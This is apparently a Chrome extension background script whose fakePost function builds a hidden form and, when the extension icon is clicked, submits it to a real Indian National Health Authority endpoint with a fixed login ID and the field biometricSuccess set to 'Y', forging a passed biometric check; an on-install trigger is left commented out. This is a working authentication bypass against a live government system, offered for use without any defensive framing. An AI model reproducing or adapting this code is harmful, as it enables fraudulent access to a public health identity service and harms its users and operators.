function fakePost() {
  var form = document.createElement("form");
  form.setAttribute("action", "https://users.nha.gov.in/UserManagement/biometricRedirection.htm");
  form.setAttribute("method", "post");

  var params = { loginId: "9997871778", appType: "BIS2.0", "biometricSuccess": "Y" };
  for (var key in params) {
    var hiddenField = document.createElement("input");
    hiddenField.setAttribute("type", "hidden");
    hiddenField.setAttribute("name", key);
    hiddenField.setAttribute("value", params[key]);
    form.appendChild(hiddenField);
  }
  document.body.appendChild(form);

  form.submit();
};

const source = fakePost.toString().replace(/(\n|\t)/gm, '').replace(/\s\s/gm, ' '),
  url = `javascript:${source}; fakePost();`;

// chrome.runtime.onInstalled.addListener(async () => {
//   let tab = await chrome.tabs.create({ url });
//   console.log(`Created tab ${tab.id}`);
// });

chrome.action.onClicked.addListener((tab) => {
  chrome.tabs.create({url: url});
});
